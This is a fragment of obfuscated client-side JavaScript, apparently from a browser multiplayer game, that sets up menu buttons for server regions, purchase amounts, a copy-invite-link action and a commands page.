			this.buttons[ᐃⲆ] = Δⵠⵠ(58, 64, "", [ⲆΔ.ᐃⲆⵠⲆⵠⵠΔ, ⲆΔ.ⲆᐃᐃⲆⵠⵠᐃ, ⲆΔ.ⲆⲆⵠΔⵠⵠΔ], ᐃΔⲆⵠ, Ⲇⵠᐃᐃ, (function() {
				ⲆΔᐃⵠ(ΔᐃⵠⵠΔ)
			}), 300, 88, ΔⲆⲆⵠ | ⲆΔⵠⲆ, ⲆᐃⲆⲆ);
			this.buttons[ᐃⲆ++].view = ᐃⲆᐃⵠᐃ;
			this.buttons[ᐃⲆ] = Δⵠⵠ(323, 112, "", [ⲆΔ.ΔᐃⵠⲆⵠᐃⵠ, ⲆΔ.ΔⵠᐃΔⲆⵠⲆ, ⲆΔ.ᐃᐃᐃⲆⲆᐃΔ], ᐃΔⲆⵠ, Ⲇⵠᐃᐃ, (function() {
				ⲆΔᐃⵠ(ᐃΔⵠΔⵠ);
				ⲆᐃⵠⲆⲆⵠΔⵠⲆ.ΔᐃΔᐃⲆ()
			}), -315, 185, ΔⲆⲆⵠ | ⲆΔⵠⲆ, ⲆᐃⲆⲆ);
			this.buttons[ᐃⲆ++].view = ⲆΔⵠⵠΔ;
			this.buttons[ᐃⲆ] = Δⵠⵠ(323, 112, "", [ⲆΔ.ⵠⲆⵠⲆⲆⵠΔ, ⲆΔ.ᐃⲆⲆΔⲆᐃⲆ, ⲆΔ.ᐃΔⲆⲆⲆΔΔ], ᐃΔⲆⵠ, Ⲇⵠᐃᐃ, (function() {
				ⲆΔᐃⵠ(ᐃΔⵠᐃⲆ);
				ⲆⵠⵠⵠΔⵠⲆΔΔ.ΔᐃΔᐃⲆ()
			}), -315, 321, ΔⲆⲆⵠ | ⲆΔⵠⲆ, ⲆᐃⲆⲆ);
			this.buttons[ᐃⲆ++].view = ⲆΔⵠⵠΔ;
			this.buttons[ᐃⲆ] = Δⵠⵠ(323, 112, "", [ⲆΔ.ⵠΔⵠⲆᐃᐃΔ, ⲆΔ.ΔⲆᐃⵠΔᐃΔ, ⲆΔ.ⲆⵠⲆⵠⲆΔⵠ], ᐃΔⲆⵠ, Ⲇⵠᐃᐃ, (function() {
				ⲆΔᐃⵠ(ⲆⵠΔⲆⵠ);
				ΔᐃΔᐃΔᐃᐃⲆᐃ.ΔᐃΔᐃⲆ()
			}), 153, 185, ΔⲆⲆⵠ | ⲆΔⵠⲆ, ⲆᐃⲆⲆ);
			this.buttons[ᐃⲆ++].view = ⲆΔⵠⵠΔ;
			this.buttons[ᐃⲆ] = Δⵠⵠ(323, 112, "", [ⲆΔ.ΔⲆⵠᐃᐃⲆⲆ, ⲆΔ.ᐃⵠⲆᐃΔⵠⵠ, ⲆΔ.ΔᐃᐃⵠΔⵠΔ], ᐃΔⲆⵠ, Ⲇⵠᐃᐃ, (function() {
				ⲆΔᐃⵠ(ᐃⲆΔⲆΔ);
				ⲆⲆⲆⵠⲆᐃⲆⲆΔ.ΔᐃΔᐃⲆ()
			}), 153, 321, ΔⲆⲆⵠ | ⲆΔⵠⲆ, ⲆᐃⲆⲆ);
			this.buttons[ᐃⲆ++].view = ⲆΔⵠⵠΔ;
			this.buttons[ᐃⲆ] = Δⵠⵠ(323, 112, "", [ⲆΔ.ⲆΔⵠⵠⲆⲆⲆ, ⲆΔ.ΔⵠᐃΔⲆⲆⲆ, ⲆΔ.ΔΔΔΔⵠᐃⵠ], ᐃΔⲆⵠ, Ⲇⵠᐃᐃ, (function() {
				ⲆΔᐃⵠ(ᐃᐃⵠⲆⵠ);
				ᐃⵠᐃᐃⲆⵠⲆΔᐃ.ΔᐃΔᐃⲆ()
			}), 153, 463, ΔⲆⲆⵠ | ⲆΔⵠⲆ, ⲆᐃⲆⲆ);
			this.buttons[ᐃⲆ++].view = ⲆΔⵠⵠΔ;
			this.buttons[ᐃⲆ] = Δⵠⵠ(323, 112, "", [ⲆΔ.ⲆⲆⲆⵠⲆΔΔ, ⲆΔ.ⵠᐃᐃⲆⵠᐃᐃ, ⲆΔ.ΔᐃⵠⵠΔⲆⵠ], ᐃΔⲆⵠ, Ⲇⵠᐃᐃ, (function() {
				ⲆΔᐃⵠ(ⵠᐃΔⲆΔ);
				ᐃᐃⲆⲆⵠᐃⲆΔⵠ.ΔᐃΔᐃⲆ()
			}), -315, 463, ΔⲆⲆⵠ | ⲆΔⵠⲆ, ⲆᐃⲆⲆ);
			this.buttons[ᐃⲆ++].view = ⲆΔⵠⵠΔ;
			this.buttons[ᐃⲆ] = Δⵠⵠ(327, 117, "", [ⲆΔ.ⲆᐃⲆⲆΔΔⲆ, ⲆΔ.ᐃⵠΔᐃⲆᐃΔ, ⲆΔ.ΔᐃⲆⵠⲆᐃⵠ], ᐃΔⲆⵠ, Ⲇⵠᐃᐃ, (function() {
				ⲆΔᐃⵠ(ΔᐃΔᐃᐃⵠⵠ)
			}), 155, 70, ΔⲆᐃⵠ, ⵠⵠᐃΔ);
			this.buttons[ᐃⲆ++].view = ⲆⵠΔΔΔ;
			this.buttons[ᐃⲆ] = Δⵠⵠ(130, 129, "", [ⲆΔ.ⵠᐃΔⲆᐃᐃΔ, ⲆΔ.ΔⲆᐃⲆΔᐃⵠ, ⲆΔ.ᐃᐃⲆⵠⲆⵠΔ], ᐃΔⲆⵠ, Ⲇⵠᐃᐃ, (function() {
				ⲆΔᐃⵠⵠ(ⵠⵠⵠⲆΔⵠⵠ, ⲆᐃⲆⲆ, ⵠ[465]);
				ⲆΔᐃⵠ(ΔᐃⵠⵠΔ)
			}), ⵠⲆⲆᐃⵠ, 40, ΔⲆⲆⵠ | ⲆΔⵠⲆ, ⲆᐃⲆⲆ);
			this.buttons[ᐃⲆ++].view = ⵠⵠⵠⲆΔⵠⵠ;
			this.buttons[ᐃⲆ] = Δⵠⵠ(130, 129, "", [ⲆΔ.ⵠᐃΔⲆᐃᐃΔ, ⲆΔ.ΔⲆᐃⲆΔᐃⵠ, ⲆΔ.ᐃᐃⲆⵠⲆⵠΔ], ᐃΔⲆⵠ, Ⲇⵠᐃᐃ, (function() {
				ⲆΔᐃⵠⵠ(ⵠⵠᐃᐃⵠᐃⵠ, ⲆᐃⲆⲆ, ⵠ[465]);
				ⲆΔᐃⵠ(ΔᐃⵠⵠΔ)
			}), ᐃⵠᐃΔⵠ, 40, ΔⲆⲆⵠ | ⲆΔⵠⲆ, ⲆᐃⲆⲆ);
			this.buttons[ᐃⲆ++].view = ⵠⵠᐃᐃⵠᐃⵠ;
			this.buttons[ᐃⲆ] = Δⵠⵠ(115, 73, "", [ⲆΔ.ⲆⵠᐃⲆᐃ, ⲆΔ.ᐃᐃⲆΔΔ, ⲆΔ.ᐃⵠⵠΔᐃ], ᐃΔⲆⵠ, Ⲇⵠᐃᐃ, (function() {
				ⲆΔᐃⵠ(ΔᐃⵠⵠΔ)
			}), 200, 140, ΔⲆⲆⵠ | ⲆΔⵠⲆ, ⲆᐃⲆⲆ);
			this.buttons[ᐃⲆ++].view = ᐃⲆᐃⵠⲆ;
			this.buttons[ᐃⲆ] = Δⵠⵠ(524, 110, "", [ⲆΔ.ⵠΔᐃΔᐃⵠⲆ, ⲆΔ.ΔᐃⵠΔΔⲆⲆ, ⲆΔ.ᐃⵠΔΔⵠⲆⲆ], ᐃΔⲆⵠ, Ⲇⵠᐃᐃ, (function() {
				ΔⲆΔⲆⲆΔⵠ("Atlanta")
			}), -265, 300, ΔⲆⲆⵠ | ⲆΔⵠⲆ, ⲆᐃⲆⲆ);
			this.buttons[ᐃⲆ++].view = ᐃⲆᐃⵠⲆ;
			this.buttons[ᐃⲆ] = Δⵠⵠ(523, 110, "", [ⲆΔ.ΔⲆⵠⲆⲆⵠⲆ, ⲆΔ.ᐃᐃⲆᐃᐃⲆΔ, ⲆΔ.ⲆᐃᐃⵠΔⲆⲆ], ᐃΔⲆⵠ, Ⲇⵠᐃᐃ, (function() {
				ΔⲆΔⲆⲆΔⵠ("LosAngeles")
			}), ⵠᐃΔⲆ, 300, ΔⲆⲆⵠ | ⲆΔⵠⲆ, ⲆᐃⲆⲆ);
			this.buttons[ᐃⲆ++].view = ᐃⲆᐃⵠⲆ;
			this.buttons[ᐃⲆ] = Δⵠⵠ(344, 110, "", [ⲆΔ.ᐃⵠⲆΔΔⲆⵠ, ⲆΔ.ᐃΔᐃⵠⵠΔΔ, ⲆΔ.ⲆΔⲆⵠⵠΔⵠ], ᐃΔⲆⵠ, Ⲇⵠᐃᐃ, (function() {
				ΔⲆΔⲆⲆΔⵠ("Frankfurt")
			}), -265, 365, ΔⲆⲆⵠ | ⲆΔⵠⲆ, ⲆᐃⲆⲆ);
			this.buttons[ᐃⲆ++].view = ᐃⲆᐃⵠⲆ;
			this.buttons[ᐃⲆ] = Δⵠⵠ(344, 110, "", [ⲆΔ.ⲆⲆᐃⵠΔⲆⲆ, ⲆΔ.ᐃΔᐃΔⲆⵠΔ, ⲆΔ.ΔΔⲆⵠᐃᐃⵠ], ᐃΔⲆⵠ, Ⲇⵠᐃᐃ, (function() {
				ΔⲆΔⲆⲆΔⵠ("Osaka")
			}), 100, 365, ΔⲆⲆⵠ | ⲆΔⵠⲆ, ⲆᐃⲆⲆ);
			this.buttons[ᐃⲆ++].view = ᐃⲆᐃⵠⲆ;
			this.buttons[ᐃⲆ] = Δⵠⵠ(344, 110, "", [ⲆΔ.ᐃᐃⵠⵠΔⲆⲆ, ⲆΔ.ⵠⵠⵠᐃⲆᐃⵠ, ⲆΔ.ⵠⲆΔᐃⵠⲆΔ], ᐃΔⲆⵠ, Ⲇⵠᐃᐃ, (function() {
				ΔⲆΔⲆⲆΔⵠ("Sydney")
			}), -86, 365, ΔⲆⲆⵠ | ⲆΔⵠⲆ, ⲆᐃⲆⲆ);
			this.buttons[ᐃⲆ++].view = ᐃⲆᐃⵠⲆ;
			this.buttons[ᐃⲆ] = Δⵠⵠ(115, 73, "", [ⲆΔ.ⲆⵠᐃⲆᐃ, ⲆΔ.ᐃᐃⲆΔΔ, ⲆΔ.ᐃⵠⵠΔᐃ], ᐃΔⲆⵠ, Ⲇⵠᐃᐃ, (function() {
				ⲆΔᐃⵠ(ᐃⲆᐃⵠⲆ)
			}), 224, 140, ΔⲆⲆⵠ | ⲆΔⵠⲆ, ⲆᐃⲆⲆ);
			this.buttons[ᐃⲆ++].view = ᐃΔᐃᐃⵠ;
			this.buttons[ᐃⲆ] = Δⵠⵠ(230, 352, "", [ⲆΔ.ⵠⲆᐃᐃΔⵠᐃ, ⲆΔ.ᐃⲆᐃⲆⵠΔⲆ, ⲆΔ.ΔΔᐃΔᐃᐃᐃ], ᐃΔⲆⵠ, Ⲇⵠᐃᐃ, (function() {
				ΔⲆᐃᐃⵠᐃⵠ(350)
			}), -280, 240, ΔⲆⲆⵠ | ⲆΔⵠⲆ, ⲆᐃⲆⲆ);
			this.buttons[ᐃⲆ++].view = ᐃΔᐃᐃⵠ;
			this.buttons[ᐃⲆ] = Δⵠⵠ(230, 352, "", [ⲆΔ.ᐃΔᐃⲆⲆᐃΔ, ⲆΔ.ΔⵠΔΔⲆⵠⲆ, ⲆΔ.ⲆᐃⵠⲆᐃΔⲆ], ᐃΔⲆⵠ, Ⲇⵠᐃᐃ, (function() {
				ΔⲆᐃᐃⵠᐃⵠ(700)
			}), -130, 240, ΔⲆⲆⵠ | ⲆΔⵠⲆ, ⲆᐃⲆⲆ);
			this.buttons[ᐃⲆ++].view = ᐃΔᐃᐃⵠ;
			this.buttons[ᐃⲆ] = Δⵠⵠ(230, 352, "", [ⲆΔ.ⲆⵠΔⲆΔᐃΔ, ⲆΔ.ᐃᐃⵠⵠⲆⵠᐃ, ⲆΔ.ΔⲆⵠⵠⲆΔⲆ], ᐃΔⲆⵠ, Ⲇⵠᐃᐃ, (function() {
				ΔⲆᐃᐃⵠᐃⵠ(1400)
			}), ⵠⵠⵠⲆᐃ, 240, ΔⲆⲆⵠ | ⲆΔⵠⲆ, ⲆᐃⲆⲆ);
			this.buttons[ᐃⲆ++].view = ᐃΔᐃᐃⵠ;
			this.buttons[ᐃⲆ] = Δⵠⵠ(230, 352, "", [ⲆΔ.ⲆΔⲆΔⲆΔⵠ, ⲆΔ.ⲆᐃᐃⵠⵠⵠΔ, ⲆΔ.ᐃⲆⲆΔΔⲆⵠ], ᐃΔⲆⵠ, Ⲇⵠᐃᐃ, (function() {
				ΔⲆᐃᐃⵠᐃⵠ(3e3)
			}), 170, 240, ΔⲆⲆⵠ | ⲆΔⵠⲆ, ⲆᐃⲆⲆ);
			this.buttons[ᐃⲆ++].view = ᐃΔᐃᐃⵠ;
			this.buttons[ᐃⲆ] = Δⵠⵠ(105, 119, "", [ⲆΔ.ⲆⲆΔΔᐃΔⵠ, ⲆΔ.ⵠᐃΔⲆᐃⲆⲆ, ⲆΔ.ᐃΔΔⵠΔΔⲆ], ᐃΔⲆⵠ, Ⲇⵠᐃᐃ, (function() {
				const ΔΔⲆᐃΔ = document[ΔᐃⲆⵠⲆⵠΔ[68]](ⵠ[378]).value.split(ⵠ[517]);
				const ᐃᐃΔⲆᐃ = ᐃⲆᐃΔᐃⵠᐃ[ΔᐃⲆⵠⲆⵠΔ[94]][ΔᐃⲆⵠⲆⵠΔ[224]]("textarea");
				ᐃᐃΔⲆᐃ.value = ᐃΔⵠⵠⵠᐃΔ + "?server=" + ΔΔⲆᐃΔ[1] + ⵠ[476] + ΔΔⲆᐃΔ[0];
				ᐃⲆᐃΔᐃⵠᐃ[ΔᐃⲆⵠⲆⵠΔ[94]][ΔᐃⲆⵠⲆⵠΔ[170]][ΔᐃⲆⵠⲆⵠΔ[242]](ᐃᐃΔⲆᐃ);
				ᐃᐃΔⲆᐃ.select();
				ᐃⲆᐃΔᐃⵠᐃ[ΔᐃⲆⵠⲆⵠΔ[94]][ΔᐃⲆⵠⲆⵠΔ[143]]("copy");
				ᐃⲆᐃΔᐃⵠᐃ[ΔᐃⲆⵠⲆⵠΔ[94]][ΔᐃⲆⵠⲆⵠΔ[170]][ΔᐃⲆⵠⲆⵠΔ[246]](ᐃᐃΔⲆᐃ)
			}), 105, 310, ΔⲆⲆⵠ | ⲆΔⵠⲆ, ⲆᐃⲆⲆ);
			this.buttons[ᐃⲆ++].view = ⵠᐃⲆⵠⵠ;
			this.buttons[ᐃⲆ] = Δⵠⵠ(105, 119, "", [ⲆΔ.ᐃΔᐃΔᐃΔⵠ, ⲆΔ.ᐃⵠⵠⵠᐃⲆΔ, ⲆΔ.ΔⵠΔⵠⵠᐃᐃ], ᐃΔⲆⵠ, Ⲇⵠᐃᐃ, (function() {
				ᐃⵠⲆⲆⵠΔⲆⲆⲆ()
			}), 235, 310, ΔⲆⲆⵠ | ⲆΔⵠⲆ, ⲆᐃⲆⲆ);
			this.buttons[ᐃⲆ++].view = ⵠᐃⲆⵠⵠ;
			this.buttons[ᐃⲆ] = Δⵠⵠ(105, 119, "", [ⲆΔ.ⵠⵠⵠⵠᐃΔⲆ, ⲆΔ.ⲆⵠⲆⲆⵠⵠⲆ, ⲆΔ.ⵠΔᐃⲆΔᐃⲆ], ᐃΔⲆⵠ, Ⲇⵠᐃᐃ, (function() {
				ᐃΔⲆⲆᐃΔᐃⵠⵠ()
			}), 170, 310, ΔⲆⲆⵠ | ⲆΔⵠⲆ, ⲆᐃⲆⲆ);
			this.buttons[ᐃⲆ++].view = ⵠᐃⲆⵠⵠ;
			this.buttons[ᐃⲆ] = Δⵠⵠ(204, 115, "", [ⲆΔ.ⵠⵠⲆᐃⵠⵠⵠ, ⲆΔ.ⵠⲆΔⵠᐃΔⵠ, ⲆΔ.ΔⵠⲆⲆⲆᐃⵠ], ᐃΔⲆⵠ, Ⲇⵠᐃᐃ, (function() {
				ᐃⲆᐃΔᐃⵠᐃ[ΔᐃⲆⵠⲆⵠΔ[72]]("./commands.html", ⵠ[513])
			}), -265, 490, ΔⲆⲆⵠ | ⲆΔⵠⲆ, ⲆᐃⲆⲆ);
			this.buttons[ᐃⲆ++].view = ⵠᐃⲆⵠⵠ;
			this.buttons[ᐃⲆ] = Δⵠⵠ(145, 69, "", [ⲆΔ.ᐃᐃⵠᐃᐃⵠⲆ, ⲆΔ.ΔΔᐃⵠΔΔΔ, ⲆΔ.ᐃⵠⵠⲆΔᐃⵠ], ᐃΔⲆⵠ, Ⲇⵠᐃᐃ, (function() {
				ⲆΔᐃⵠ(ΔᐃⲆᐃΔᐃⵠ)
			}), -210, 170, ΔⲆⲆⵠ | ⲆΔⵠⲆ, ⲆᐃⲆⲆ);
			this.buttons[ᐃⲆ++].view = ΔᐃⵠⵠΔ;
			this.buttons[ᐃⲆ] = Δⵠⵠ(145, 69, "", [ⲆΔ.ⲆᐃᐃᐃᐃΔⵠ, ⲆΔ.ᐃΔᐃⵠⵠᐃⲆ, ⲆΔ.ⲆΔⵠⵠⲆᐃᐃ], ᐃΔⲆⵠ, Ⲇⵠᐃᐃ, (function() {
				ⲆΔᐃⵠ(ΔᐃΔΔⲆⲆΔ)
			}), 70, 170, ΔⲆⲆⵠ | ⲆΔⵠⲆ, ⲆᐃⲆⲆ);
			this.buttons[ᐃⲆ++].view = ΔᐃⵠⵠΔ;
			this.buttons[ᐃⲆ] = Δⵠⵠ(145, 69, "", [ⲆΔ.ᐃⵠᐃᐃΔᐃⲆ, ⲆΔ.ⵠᐃΔⵠⵠⲆⲆ, ⲆΔ.ⲆΔΔⲆⵠΔⲆ], ᐃΔⲆⵠ, Ⲇⵠᐃᐃ, (function() {
				ⲆΔᐃⵠ(ⵠΔΔⵠⵠⵠᐃ)
			}), 70, 204, ΔⲆⲆⵠ | ⲆΔⵠⲆ, ⲆᐃⲆⲆ);
			this.buttons[ᐃⲆ++].view = ΔᐃⵠⵠΔ;
			this.buttons[ᐃⲆ] = Δⵠⵠ(145, 69, "", [ⲆΔ.ᐃⲆΔⵠⲆⲆⲆ, ⲆΔ.ᐃΔⵠΔΔⵠⲆ, ⲆΔ.ᐃⲆΔⵠΔⲆᐃ], ᐃΔⲆⵠ, Ⲇⵠᐃᐃ, (function() {
				ⲆΔᐃⵠ(ΔⲆΔⲆᐃᐃᐃ)
			}), -210, 204, ΔⲆⲆⵠ | ⲆΔⵠⲆ, ⲆᐃⲆⲆ);
			this.buttons[ᐃⲆ++].view = ΔᐃⵠⵠΔ;
			this.buttons[ᐃⲆ] = Δⵠⵠ(145, 69, "", [ⲆΔ.ᐃⲆΔⵠⲆⲆⲆ, ⲆΔ.ᐃΔⵠΔΔⵠⲆ, ⲆΔ.ᐃⲆΔⵠΔⲆᐃ], ᐃΔⲆⵠ, Ⲇⵠᐃᐃ, (function() {
				ⲆΔᐃⵠ(ᐃΔⵠⵠⲆΔᐃ)
			}), 70, 238, ΔⲆⲆⵠ | ⲆΔⵠⲆ, ⲆᐃⲆⲆ);
			this.buttons[ᐃⲆ++].view = ΔᐃⵠⵠΔ;
			this.buttons[ᐃⲆ] = Δⵠⵠ(145, 69, "", [ⲆΔ.ᐃⲆΔⵠⲆⲆⲆ, ⲆΔ.ᐃΔⵠΔΔⵠⲆ, ⲆΔ.ᐃⲆΔⵠΔⲆᐃ], ᐃΔⲆⵠ, Ⲇⵠᐃᐃ, (function() {
				if (ᐃᐃᐃ.ᐃΔΔⲆᐃ()) ᐃΔΔᐃⵠⲆⲆ(ΔΔⵠ, 300);
				else ⲆΔᐃⵠ(ᐃᐃΔᐃⵠ)
			}), 307, 205, ΔⲆⲆⵠ | ⲆΔⵠⲆ, ⲆᐃⲆⲆ);
			this.buttons[ᐃⲆ++].view = ΔᐃⵠⵠΔ;
			this.buttons[ᐃⲆ] = Δⵠⵠ(145, 69, "", [ⲆΔ.ΔⵠⲆᐃΔᐃΔ, ⲆΔ.ᐃΔΔⵠⲆᐃΔ, ⲆΔ.ⵠⲆⵠⵠⵠΔΔ], ᐃΔⲆⵠ, Ⲇⵠᐃᐃ, (function() {
				ⲆΔᐃⵠ(ᐃⵠⵠⲆΔΔΔ)
			}), -210, 238, ΔⲆⲆⵠ | ⲆΔⵠⲆ, ⲆᐃⲆⲆ);
			this.buttons[ᐃⲆ++].view = ΔᐃⵠⵠΔ;
			this.buttons[ᐃⲆ] = Δⵠⵠ(145, 69, "", [ⲆΔ.ΔⵠⲆᐃΔᐃΔ, ⲆΔ.ᐃΔΔⵠⲆᐃΔ, ⲆΔ.ⵠⲆⵠⵠⵠΔΔ], ᐃΔⲆⵠ, Ⲇⵠᐃᐃ, (function() {
				ᐃᐃᐃ.ᐃΔΔⲆᐃ() ? ᐃΔΔᐃⵠⲆⲆ(1, 600) : ⲆΔᐃⵠ(ᐃᐃΔᐃⵠ)
			}), 307, 239, ΔⲆⲆⵠ | ⲆΔⵠⲆ, ⲆᐃⲆⲆ);
			this.buttons[ᐃⲆ++].view = ΔᐃⵠⵠΔ;
			this.buttons[ᐃⲆ] = Δⵠⵠ(192, 101, "", [ⲆΔ.ᐃΔⲆⲆⲆΔᐃ, ⲆΔ.ΔΔᐃⲆᐃⵠᐃ, ⲆΔ.ⵠⲆΔᐃΔⵠᐃ], ᐃΔⲆⵠ, Ⲇⵠᐃᐃ, (function() {
				ᐃᐃⵠΔΔⲆΔ()
			}), -ΔᐃⲆⲆⲆ, 250, ΔⲆⲆⵠ | ⲆΔⵠⲆ, ⲆᐃⲆⲆ);
			this.buttons[ᐃⲆ++].view = ⲆⵠᐃⲆⲆⲆᐃ;
			this.buttons[ᐃⲆ] = Δⵠⵠ(192, 104, "", [ⲆΔ.ᐃⵠᐃⲆⲆⲆᐃ, ⲆΔ.ⵠⲆΔⵠΔᐃᐃ, ⲆΔ.ᐃΔΔⲆⵠⲆⲆ], ᐃΔⲆⵠ, Ⲇⵠᐃᐃ, (function() {
				ᐃᐃⵠΔΔⲆΔ()
			}), -ⵠⵠΔᐃᐃ, 239, ΔⲆⲆⵠ | ⲆΔⵠⲆ, ⲆᐃⲆⲆ);
			this.buttons[ᐃⲆ++].view = ⲆⲆⲆΔᐃⲆⲆ;
			this.buttons[ᐃⲆ] = Δⵠⵠ(192, 101, "", [ⲆΔ.ΔⲆᐃΔⲆⲆᐃ, ⲆΔ.ⲆⵠⲆᐃⵠΔᐃ, ⲆΔ.ⵠⲆⵠᐃᐃⵠΔ], ᐃΔⲆⵠ, Ⲇⵠᐃᐃ, (function() {
				ⲆΔᐃⵠ(Ⲇⵠᐃⵠᐃ)
			}), ᐃΔᐃΔⲆ, 250, ΔⲆⲆⵠ | ⲆΔⵠⲆ, ⲆᐃⲆⲆ);
			this.buttons[ᐃⲆ++].view = ⲆⵠᐃⲆⲆⲆᐃ;
			this.buttons[ᐃⲆ] = Δⵠⵠ(192, 104, "", [ⲆΔ.ᐃⵠⵠΔᐃⲆᐃ, ⲆΔ.ⲆΔΔⲆⲆΔⵠ, ⲆΔ.ⵠⲆᐃΔΔⵠᐃ], ᐃΔⲆⵠ, Ⲇⵠᐃᐃ, (function() {
				ⲆΔᐃⵠ(Ⲇⵠᐃⵠᐃ)
			}), ᐃⵠᐃΔⵠ, 239, ΔⲆⲆⵠ | ⲆΔⵠⲆ, ⲆᐃⲆⲆ);
			this.buttons[ᐃⲆ++].view = ⲆⲆⲆΔᐃⲆⲆ;
			ⵠᐃᐃᐃⵠ = [];
			ⵠᐃᐃᐃⵠ[ⵠⵠⵠ.ⵠᐃⵠΔΔ] = [ⲆΔ.ⲆⲆΔᐃᐃⵠⲆ, ⲆΔ.ΔᐃⲆᐃⲆⲆΔ, ⲆΔ.ⲆΔΔᐃᐃᐃᐃ];
			ⵠᐃᐃᐃⵠ[ⵠⵠⵠ.ⵠⲆⲆᐃ] = [ⲆΔ.ⲆᐃⵠⲆ, ⲆΔ.ᐃΔⵠΔ, ⲆΔ.ⵠⲆΔⲆ];
			ⵠᐃᐃᐃⵠ[ⵠⵠⵠ.ᐃᐃΔⲆ] = [ⲆΔ.ᐃⵠᐃΔⵠΔⵠ, ⲆΔ.ᐃΔᐃᐃΔⲆΔ, ⲆΔ.ⵠᐃΔⵠⵠᐃᐃ];
			ⵠᐃᐃᐃⵠ[ⵠⵠⵠ.ΔⲆⵠⵠ] = [ⲆΔ.ⵠⲆΔⲆΔΔΔ, ⲆΔ.ⵠⵠⲆⲆⵠⵠⵠ, ⲆΔ.ᐃⵠΔᐃⵠΔΔ];
			ⵠᐃᐃᐃⵠ[ⵠⵠⵠ.ΔⲆᐃΔ] = [ⲆΔ.ΔⵠᐃⵠⲆⲆᐃ, ⲆΔ.ⵠᐃΔⲆⵠⵠⲆ, ⲆΔ.ΔᐃⵠΔⲆⲆᐃ];
			ⵠᐃᐃᐃⵠ[ⵠⵠⵠ.ⲆⵠΔⲆ] = [ⲆΔ.ΔΔⲆⲆᐃⲆⲆ, ⲆΔ.ⵠⵠⲆᐃᐃᐃⵠ, ⲆΔ.ΔⵠⵠⲆᐃⲆⲆ];
			ⵠᐃᐃᐃⵠ[ⵠⵠⵠ.ⲆΔᐃᐃ] = [ⲆΔ.ⵠⵠΔⵠΔⵠΔ, ⲆΔ.ⲆⵠΔᐃⵠᐃΔ, ⲆΔ.ⵠᐃⲆⲆⲆΔᐃ];
			ⵠᐃᐃᐃⵠ[ⵠⵠⵠ.ⲆᐃΔᐃⵠ] = [ⲆΔ.ΔΔΔⲆᐃⲆⵠ, ⲆΔ.ⵠⲆⲆⲆⵠⵠⵠ, ⲆΔ.ⲆᐃΔⲆⵠⲆΔ];
			ⵠᐃᐃᐃⵠ[ⵠⵠⵠ.ⲆⲆⲆⵠⲆⵠⵠ] = [ⲆΔ.ΔΔⲆΔⵠᐃⵠ, ⲆΔ.ᐃᐃⵠⲆΔⵠΔ, ⲆΔ.ᐃⵠⲆΔΔᐃᐃ];
			ΔⵠⲆⵠⲆⲆⲆ = ᐃⲆ;
			this.buttons[ᐃⲆ] = Δⵠⵠ(178, 182, "", [ⲆΔ.ⲆᐃⵠⲆ, ⲆΔ.ᐃΔⵠΔ, ⲆΔ.ⵠⲆΔⲆ], ᐃΔⲆⵠ, Ⲇⵠᐃᐃ, ᐃⵠᐃⵠᐃ, -29, 205, ΔⲆⲆⵠ | ⲆΔⵠⲆ, ⲆᐃⲆⲆ);
			this.buttons[ᐃⲆ++].view = ᐃΔⵠΔⵠ;
			this.buttons[ᐃⲆ] = Δⵠⵠ(178, 182, "", [ⲆΔ.ⲆᐃⵠⲆ, ⲆΔ.ᐃΔⵠΔ, ⲆΔ.ⵠⲆΔⲆ], ᐃΔⲆⵠ, Ⲇⵠᐃᐃ, ⵠⵠⵠⲆⵠ, -29, 300, ΔⲆⲆⵠ | ⲆΔⵠⲆ, ⲆᐃⲆⲆ);
			this.buttons[ᐃⲆ++].view = ᐃΔⵠΔⵠ;
			this.buttons[ᐃⲆ] = Δⵠⵠ(178, 182, "", [ⲆΔ.ⲆᐃⵠⲆ, ⲆΔ.ᐃΔⵠΔ, ⲆΔ.ⵠⲆΔⲆ], ᐃΔⲆⵠ, Ⲇⵠᐃᐃ, undefined, -29, 395, ΔⲆⲆⵠ | ⲆΔⵠⲆ, ⲆᐃⲆⲆ);
			this.buttons[ᐃⲆ++].view = ᐃΔⵠΔⵠ;
			this.buttons[ᐃⲆ] = Δⵠⵠ(178, 182, "", [ⲆΔ.ⲆᐃⵠⲆ, ⲆΔ.ᐃΔⵠΔ, ⲆΔ.ⵠⲆΔⲆ], ᐃΔⲆⵠ, Ⲇⵠᐃᐃ, ⲆⵠᐃⲆⲆ, 65, 205, ΔⲆⲆⵠ | ⲆΔⵠⲆ, ⲆᐃⲆⲆ);
			this.buttons[ᐃⲆ++].view = ᐃΔⵠΔⵠ;
			this.buttons[ᐃⲆ] = Δⵠⵠ(178, 182, "", [ⲆΔ.ⲆᐃⵠⲆ, ⲆΔ.ᐃΔⵠΔ, ⲆΔ.ⵠⲆΔⲆ], ᐃΔⲆⵠ, Ⲇⵠᐃᐃ, undefined, 65, 300, ΔⲆⲆⵠ | ⲆΔⵠⲆ, ⲆᐃⲆⲆ);
			this.buttons[ᐃⲆ++].view = ᐃΔⵠΔⵠ;
			this.buttons[ᐃⲆ] = Δⵠⵠ(178, 182, "", [ⲆΔ.ⲆᐃⵠⲆ, ⲆΔ.ᐃΔⵠΔ, ⲆΔ.ⵠⲆΔⲆ], ᐃΔⲆⵠ, Ⲇⵠᐃᐃ, ⲆⵠᐃⲆⲆ, 65, 395, ΔⲆⲆⵠ | ⲆΔⵠⲆ, ⲆᐃⲆⲆ);
			this.buttons[ᐃⲆ++].view = ᐃΔⵠΔⵠ;
			this.buttons[ᐃⲆ] = Δⵠⵠ(178, 182, "", [ⲆΔ.ⲆᐃⵠⲆ, ⲆΔ.ᐃΔⵠΔ, ⲆΔ.ⵠⲆΔⲆ], ᐃΔⲆⵠ, Ⲇⵠᐃᐃ, ⲆⲆⲆⵠⵠ, 159, 205, ΔⲆⲆⵠ | ⲆΔⵠⲆ, ⲆᐃⲆⲆ);
			this.buttons[ᐃⲆ++].view = ᐃΔⵠΔⵠ;
			this.buttons[ᐃⲆ] = Δⵠⵠ(178, 182, "", [ⲆΔ.ⲆᐃⵠⲆ, ⲆΔ.ᐃΔⵠΔ, ⲆΔ.ⵠⲆΔⲆ], ᐃΔⲆⵠ, Ⲇⵠᐃᐃ, ΔΔⵠᐃΔ, 159, 300, ΔⲆⲆⵠ | ⲆΔⵠⲆ, ⲆᐃⲆⲆ);
			this.buttons[ᐃⲆ++].view = ᐃΔⵠΔⵠ;
